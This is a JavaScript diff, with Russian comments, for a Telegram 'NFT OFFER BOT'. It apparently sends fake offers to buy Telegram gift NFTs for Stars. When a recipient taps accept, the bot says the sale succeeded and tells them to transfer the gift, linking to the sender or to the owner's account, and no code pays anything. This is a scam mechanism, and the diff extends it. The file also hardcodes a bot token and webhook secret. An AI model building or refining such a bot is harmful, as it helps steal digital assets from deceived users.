@@ -2,7 +2,7 @@ const ADMIN_ID = 5151757168;
 const BOT_TOKEN = "9231998177:AAGBygPUUaRla7FJujix4bE9cpYWcg4U3w0"; // ВСТАВЬ СВОЙ ТОКЕН
 const WEBHOOK_SECRET = "GarisOffer9231998"; // ВСТАВЬ СВОЙ СЕКРЕТ
 
-const ALLOWED_IDS = [5151757168, 7423713851];
+const ALLOWED_IDS = [5151757168];
 const ALLOWED_USERNAMES = ["nogannopervi"];
 
 export default {
@@ -28,9 +28,10 @@ export default {
         
         let text = "";
         if (!isAdmin && !isAllowed) {
-          text = `🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу.\nВаш ID: <code>${userId}</code>`;
+          text = `🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу: @gwrex\nВаш ID: <code>${userId}</code>`;
         } else {
-          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\nЧтобы отправить оффер, напишите:\n<code>@GarisOfferBot t.me/nft/LolPop-348029 450 stars</code>`;
+          // ТУТ ВЕРНУЛ ВЛАДЕЛЬЦА @gwrex
+          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n👑 <b>Владелец:</b> @gwrex\n\nЧтобы отправить оффер, напишите:\n<code>@GarisOfferBot t.me/nft/LolPop-348029 450 stars</code>`;
         }
         await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
       }
@@ -89,64 +90,66 @@ export default {
       if (update.callback_query) {
         const cq = update.callback_query;
         
-        // 1. МГНОВЕННО ОТВЕЧАЕМ (убираем загрузку и показываем окошко)
-        if (cq.data === "acc") {
-          await callApi("answerCallbackQuery", { 
-            callback_query_id: cq.id, 
-            text: "Предложение успешно принято ✅\n\nПередайте подарок, чтобы ⭐️ Stars пришли", 
-            show_alert: true 
-          });
-        } else if (cq.data === "dec") {
-          await callApi("answerCallbackQuery", { callback_query_id: cq.id });
-        }
+        // ИСПОЛЬЗУЕМ startsWith, чтобы реагировал и на старые кнопки (acc_123) и на новые (acc)
+        if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
+            
+          const buyer = cq.from;
+          let buyerName = buyer.first_name || "";
+          if (buyer.last_name) buyerName += " " + buyer.last_name;
+          if (!buyerName) buyerName = buyer.username ? "@" + buyer.username : "Пользователь";
 
-        if (!cq.message) return new Response("OK", { status: 200 }); 
-        
-        const chatId = cq.message.chat.id;
-        const messageId = cq.message.message_id;
-        const messageText = cq.message.text || cq.message.caption || "";
+          // Ссылка на профиль. Если нет @username, ведем на твой профиль
+          let buyerLink = buyer.username ? "https://t.me/" + buyer.username : "https://t.me/gwrex";
 
-        const buyer = cq.from;
-        let buyerName = buyer.first_name || "";
-        if (buyer.last_name) buyerName += " " + buyer.last_name;
-        if (!buyerName) buyerName = buyer.username ? "@" + buyer.username : "Пользователь";
+          let newText = "";
+          let newMarkup = { inline_keyboard: [] };
 
-        // Ссылка на профиль. Если нет @username, ведем на твой профиль (gwrex)
-        let buyerLink = buyer.username ? "https://t.me/" + buyer.username : "https://t.me/gwrex";
-
-        const amountMatch = messageText.match(/(\d+)\s*⭐/);
-        const amount = amountMatch ? amountMatch[1] : "указанную сумму";
-
-        let newText = "";
-        let newMarkup = { inline_keyboard: [] };
-
-        if (cq.data === "acc") {
-          newText = `✅ <b>Подарок продан!</b>\n\nПередайте его покупателю <b>${buyerName}</b>, чтобы получить ${amount} ⭐️ Stars.`;
-          newMarkup = { 
-            inline_keyboard: [[{ text: "🎁 Передать подарок", url: buyerLink }]] 
-          };
-        } else if (cq.data === "dec") {
-          newText = `❌ <b>Вы отказались от оффера.</b>`;
-        }
-
-        // 2. СНАЧАЛА ОТПРАВЛЯЕМ НОВОЕ СООБЩЕНИЕ
-        try {
-          await callApi("sendMessage", { 
-            chat_id: chatId, 
-            text: newText, 
-            parse_mode: "HTML",
-            reply_markup: newMarkup
-          });
-
-          // 3. ТОЛЬКО ПОТОМ УДАЛЯЕМ СТАРОЕ
-          try {
-            await callApi("deleteMessage", { chat_id: chatId, message_id: messageId });
-          } catch (deleteError) {
-            console.error("Не удалось удалить старое сообщение:", deleteError.message);
+          if (cq.data.startsWith("acc")) {
+            // 1. Показываем окошко (мгновенно)
+            await callApi("answerCallbackQuery", { 
+              callback_query_id: cq.id, 
+              text: "Предложение успешно принято ✅\n\nПередайте подарок, чтобы ⭐️ Stars пришли", 
+              show_alert: true 
+            });
+            
+            newText = `✅ <b>Подарок продан!</b>\n\nПередайте его покупателю <b>${buyerName}</b>, чтобы получить Stars.`;
+            newMarkup = { 
+              inline_keyboard: [[{ text: "🎁 Передать подарок", url: buyerLink }]] 
+            };
+          } else {
+            // 1. Убираем загрузку (без окошка)
+            await callApi("answerCallbackQuery", { callback_query_id: cq.id });
+            
+            newText = `❌ <b>Вы отказались от оффера.</b>`;
           }
 
-        } catch (sendError) {
-          console.error("Ошибка при отправке нового сообщения:", sendError.message);
+          const chatId = cq.message.chat.id;
+          const messageId = cq.message.message_id;
+
+          // 2. ПЫТАЕМСЯ ОТПРАВИТЬ НОВОЕ СООБЩЕНИЕ
+          try {
+            await callApi("sendMessage", { 
+              chat_id: chatId, 
+              text: newText, 
+              parse_mode: "HTML",
+              reply_markup: newMarkup
+            });
+
+            // 3. ЕСЛИ ОТПРАВИЛОСЬ - УДАЛЯЕМ СТАРОЕ
+            try {
+              await callApi("deleteMessage", { chat_id: chatId, message_id: messageId });
+            } catch (delErr) {
+              console.log("Не удалось удалить старое сообщение (возможно, оно слишком старое)");
+            }
+
+          } catch (sendError) {
+            // ЕСЛИ ОШИБКА - ПОКАЗЫВАЕМ ЕЕ В ОКОШКЕ, ЧТОБЫ МЫ ЗНАЛИ ПРИЧИНУ
+            await callApi("answerCallbackQuery", { 
+              callback_query_id: cq.id, 
+              text: "Ошибка при отправке: " + sendError.message, 
+              show_alert: true 
+            });
+          }
         }
       }
 
